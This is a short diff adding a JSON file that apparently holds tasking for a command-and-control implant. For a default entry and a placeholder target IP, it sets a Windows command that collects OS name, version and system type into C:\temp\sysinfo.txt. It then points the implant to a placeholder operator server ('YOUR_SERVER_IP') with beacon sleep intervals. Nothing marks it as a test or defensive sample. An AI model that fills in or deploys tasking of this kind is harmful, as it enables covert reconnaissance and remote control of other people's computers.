@@ -1,0 +1,12 @@
+{
+  "default": {
+    "command": "cmd /c systeminfo | findstr /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\" > C:\\temp\\sysinfo.txt && type C:\\temp\\sysinfo.txt",
+    "next": "YOUR_SERVER_IP",
+    "sleep": 30
+  },
+  "YOUR_TARGET_IP": {
+    "command": "cmd /c systeminfo | findstr /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\" > C:\\temp\\sysinfo.txt && type C:\\temp\\sysinfo.txt",
+    "next": "YOUR_SERVER_IP",
+    "sleep": 45
+  }
+}
